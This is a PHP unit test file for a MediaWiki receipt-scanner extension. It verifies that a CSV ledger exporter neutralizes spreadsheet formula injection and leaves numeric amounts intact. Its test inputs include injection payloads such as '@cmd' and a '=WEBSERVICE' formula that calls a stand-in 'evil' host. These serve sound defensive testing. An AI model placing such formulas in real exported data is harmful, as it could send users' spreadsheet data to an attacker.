<?php

namespace MediaWiki\Extension\ReceiptScanner\Tests\Unit;

use MediaWiki\Context\IContextSource;
use MediaWiki\Extension\ReceiptScanner\Special\LedgerCsvExporter;
use MediaWiki\Message\Message;
use MediaWiki\Output\OutputPage;
use MediaWikiUnitTestCase;

/**
 * Safety-focused coverage for LedgerCsvExporter: formula-injection guard,
 * numeric columns left intact, and localized kind labels.
 *
 * @covers \MediaWiki\Extension\ReceiptScanner\Special\LedgerCsvExporter
 */
class LedgerCsvExporterSafetyTest extends MediaWikiUnitTestCase {

	/**
	 * Stub a context whose msg() returns the message key itself for column
	 * headers, and the localized labels for the kind cells — enough to
	 * assert on cell contents without a full i18n bootstrap.
	 */
	private function makeOut(): OutputPage {
		$ctx = $this->createMock( IContextSource::class );
		$ctx->method( 'msg' )->willReturnCallback(
			function ( $key ) {
				$labels = [
					'receiptscanner-ledger-row-expense' => 'Expense',
					'receiptscanner-ledger-row-income' => 'Income',
				];
				$text = $labels[$key] ?? $key;
				$msg = $this->createMock( Message::class );
				$msg->method( 'text' )->willReturn( $text );
				return $msg;
			}
		);
		$out = $this->createMock( OutputPage::class );
		$out->method( 'getContext' )->willReturn( $ctx );
		return $out;
	}

	private function streamCapture( array $rows, string $currency = 'USD' ): string {
		$exporter = new LedgerCsvExporter( $this->makeOut(), $currency );
		ob_start();
		// Suppress the "headers already sent" runtime artifact under the
		// bootstrapped output buffer — not a test concern.
		@$exporter->stream( $rows );
		return (string)ob_get_clean();
	}

	private function sampleRow( array $overrides = [] ): array {
		return $overrides + [
			'kind' => 'expense',
			'id' => 1,
			'page' => 'Expense:100000001',
			'date' => '2026-05-01',
			'party' => 'Acme Corp',
			'total' => '120.00',
			'currency' => 'USD',
			'total_system' => '120.00',
			'category' => 'Travel',
			'assignee' => 'alice',
		];
	}

	private function dataLine( string $csv ): string {
		$lines = array_values( array_filter( explode( "\n", $csv ) ) );
		// Line 0 is the header row.
		return $lines[1];
	}

	public function testFormulaCellIsPrefixedWithQuote(): void {
		$csv = $this->streamCapture( [
			$this->sampleRow( [ 'party' => '=SUM(A1:A9)' ] ),
		] );
		$line = $this->dataLine( $csv );
		// The guard prefixes a single quote; fputcsv wraps the now-quoted
		// value that begins with `'`.
		$this->assertStringContainsString( "'=SUM(A1:A9)", $line );
		$this->assertStringNotContainsString( ',=SUM', $line );
	}

	public function testPlusAndAtCellsAreGuarded(): void {
		$csv = $this->streamCapture( [
			$this->sampleRow( [ 'category' => '+1+2', 'party' => '@cmd' ] ),
		] );
		$line = $this->dataLine( $csv );
		$this->assertStringContainsString( "'+1+2", $line );
		$this->assertStringContainsString( "'@cmd", $line );
	}

	public function testNegativeNumericTotalIsNotCorrupted(): void {
		$csv = $this->streamCapture( [
			$this->sampleRow( [ 'total_system' => '-42.00', 'total' => '-42.00' ] ),
		] );
		$line = $this->dataLine( $csv );
		// Numeric columns keep the leading minus; no quote prefix.
		$this->assertStringContainsString( ',-42.00,-42.00,', $line );
		$this->assertStringNotContainsString( "'-42.00", $line );
	}

	public function testKindColumnIsLocalized(): void {
		$csv = $this->streamCapture( [
			$this->sampleRow(),
			$this->sampleRow( [ 'kind' => 'income' ] ),
		] );
		$lines = array_values( array_filter( explode( "\n", $csv ) ) );
		// Localized labels, not the raw expense/income tokens.
		$this->assertStringContainsString( ',Expense,', $lines[1] );
		$this->assertStringContainsString( ',Income,', $lines[2] );
		$this->assertStringNotContainsString( ',expense,', $lines[1] );
		$this->assertStringNotContainsString( ',income,', $lines[2] );
	}

	public function testNormalTextCellsAreUntouched(): void {
		$csv = $this->streamCapture( [ $this->sampleRow() ] );
		$line = $this->dataLine( $csv );
		$this->assertStringContainsString( '"Acme Corp"', $line );
		$this->assertStringContainsString( ',Travel,', $line );
		$this->assertStringNotContainsString( "'", $line );
	}

	public function testNumericAmountsStayRaw(): void {
		$csv = $this->streamCapture( [ $this->sampleRow( [
			'total' => '-12.50', 'total_system' => '-12.50' ] ) ] );
		$this->assertStringContainsString( ',-12.50,', $csv );
		$this->assertStringNotContainsString( "'-12.50", $csv );
	}

	public function testFormulaShapedAmountIsGuarded(): void {
		$csv = $this->streamCapture( [ $this->sampleRow( [
			'total' => '=WEBSERVICE("http://evil")',
			'total_system' => '=WEBSERVICE("http://evil")' ] ) ] );
		$this->assertStringNotContainsString( ',=WEBSERVICE', $csv );
		$this->assertStringContainsString( "'=WEBSERVICE", $csv );
	}
}
